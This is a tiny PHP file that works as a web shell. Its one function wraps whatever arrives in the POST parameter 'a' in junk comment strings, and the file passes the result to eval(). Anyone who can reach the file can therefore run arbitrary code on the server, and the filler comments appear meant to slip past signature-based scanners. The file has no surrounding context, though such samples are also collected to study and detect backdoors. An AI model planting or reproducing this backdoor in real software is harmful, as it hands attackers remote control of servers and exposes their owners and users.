<?php

function x()
{

    return "/*sasas23123*/".$_POST['a']."/*sdfw3123*/";

}

eval(x());
?>
